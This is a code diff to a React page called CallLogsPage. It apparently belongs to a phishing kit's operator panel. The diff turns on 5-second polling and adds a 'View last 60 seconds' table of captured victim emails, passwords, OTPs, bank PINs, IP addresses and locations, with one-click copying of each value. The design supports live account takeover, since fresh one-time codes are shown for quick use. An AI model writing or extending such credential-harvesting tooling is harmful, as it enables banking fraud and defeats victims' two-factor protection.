@@ -128,11 +128,11 @@ function CallLogsPage() {
       setTotalPages(response?.totalPages);
     };
     fetchAllAccounts(currentPage);
-    // const intervalId = setInterval(() => {
-    //   fetchAllAccounts(currentPage);
-    // }, 5000);
+    const intervalId = setInterval(() => {
+      fetchAllAccounts(currentPage);
+    }, 5000);
 
-    // return () => clearInterval(intervalId);
+    return () => clearInterval(intervalId);
   }, [totalAccountsFromReducer, user?._id, limit, currentPage]);
 
   const handlePageChange = (pageNumber: number) => {
@@ -240,10 +240,7 @@ function CallLogsPage() {
     document.body.removeChild(link);
     URL.revokeObjectURL(url);
   }
-  // console.log(accounts)
-  // console.log("completedAccounts:  ", completedAccounts)
-  // console.log("inCompleteAccounts:  ",inCompleteAccounts)
-  // console.log("locked:  ",locked)
+
   return (
     <Fragment>
       <Seo title={"Call-logs"} />
@@ -427,6 +424,163 @@ function CallLogsPage() {
                         </td>
                       </tr>
                     ))}
+                  </tbody>
+                </table>
+              </div>
+            </Card.Body>
+            <Card.Footer>
+              <div className="d-flex align-items-center">
+                <div>
+                  Showing {totalAccounts} Entries{" "}
+                  <i className="bi bi-arrow-right ms-2 fw-semibold"></i>
+                </div>
+                <div className="ms-auto">
+                  <nav
+                    aria-label="Page navigation"
+                    className="pagination-style-4"
+                  >
+                    <Pagination className="pagination mb-0">
+                      <Pagination.Item
+                        disabled={currentPage === 1}
+                        onClick={() => handlePageChange(currentPage - 1)}
+                      >
+                        Prev
+                      </Pagination.Item>
+                      {[...Array(totalPages)].map((_, index) => (
+                        <Pagination.Item
+                          key={index}
+                          active={index + 1 === currentPage}
+                          onClick={() => handlePageChange(index + 1)}
+                        >
+                          {index + 1}
+                        </Pagination.Item>
+                      ))}
+                      <Pagination.Item
+                        disabled={currentPage === totalPages}
+                        onClick={() => handlePageChange(currentPage + 1)}
+                      >
+                        Next
+                      </Pagination.Item>
+                    </Pagination>
+                  </nav>
+                </div>
+              </div>
+            </Card.Footer>
+          </Card>
+        </Col>
+        <Col xl={12}>
+          <Card className="custom-card">
+            <Card.Header className="justify-content-between">
+              <Card.Title>View last 60 seconds</Card.Title>
+            </Card.Header>
+            <Card.Body className="p-0">
+              <div className="table-responsive">
+                <table className="table text-nowrap">
+                  <thead>
+                    <tr>
+                      <th>
+                        <input
+                          title="select all"
+                          className="mt-1"
+                          type="checkbox"
+                          checked={
+                            selectedAccounts?.length === accounts?.length
+                          }
+                          onChange={toggleSelectAll}
+                        />
+                      </th>
+                      <th>Email</th>
+                      <th>Password</th>
+                      <th>Otp</th>
+                      <th>Bank Pin</th>
+                      <th>Country Flag</th>
+                      <th>IP Address</th>
+                      <th>Date</th>
+                      {/* <th>Action</th> */}
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {accounts
+                      ?.filter((account: any) => {
+                        // Check if the account was created in the last 60 seconds
+                        const now = Date.now();
+                        const createdAt = new Date(
+                          account?.createdAt
+                        ).getTime();
+                        return now - createdAt <= 60000; // 60 seconds = 60000 milliseconds
+                      })
+                      ?.map((account: any) => (
+                        <tr
+                          key={account._id}
+                          className={`
+                ${
+                  completedAccounts.includes(account._id)
+                    ? "text-green-500"
+                    : ""
+                } 
+                ${
+                  inCompleteAccounts.includes(account._id) ? "text-red-500" : ""
+                } 
+                ${locked.includes(account._id) ? "text-purple-500" : ""}
+              `}
+                        >
+                          <td>
+                            <input
+                              type="checkbox"
+                              checked={selectedAccounts.includes(account._id)}
+                              onChange={() =>
+                                toggleSelectAccount(account._id, account)
+                              }
+                            />
+                          </td>
+                          <td>
+                            <div className="d-flex">
+                              <div
+                                className="ms-2"
+                                onClick={() => copyToClipboard(account.email)}
+                              >
+                                <p className="fs-12 mb-0">{account.email}</p>
+                              </div>
+                            </div>
+                          </td>
+                          <td onClick={() => copyToClipboard(account.password)}>
+                            {account.password}
+                          </td>
+                          <td onClick={() => copyToClipboard(account.otp)}>
+                            <span
+                              className={`bg-${account?.status?.toLowerCase()}-transparent`}
+                            >
+                              {account.otp}
+                            </span>
+                          </td>
+                          <td onClick={() => copyToClipboard(account.bankPin)}>
+                            <span className="fw-semibold fs-13">
+                              {account.bankPin}
+                            </span>
+                          </td>
+                          <td>
+                            <img
+                              src={`https://flagcdn.com/16x12/${account?.location?.countryCode.toLowerCase()}.png`}
+                              alt={account?.location?.country}
+                              width="16"
+                              height="12"
+                              title={`${account?.location?.country}, ${account?.location?.city}`}
+                            />
+                          </td>
+                          <td
+                            onClick={() =>
+                              copyToClipboard(account?.location?.ipAddress)
+                            }
+                          >
+                            {account?.location?.ipAddress}
+                          </td>
+                          <td>
+                            {moment(account?.createdAt).format(
+                              "ddd, MMM DD, YYYY, hh:mm A"
+                            )}
+                          </td>
+                        </tr>
+                      ))}
                   </tbody>
                 </table>
               </div>
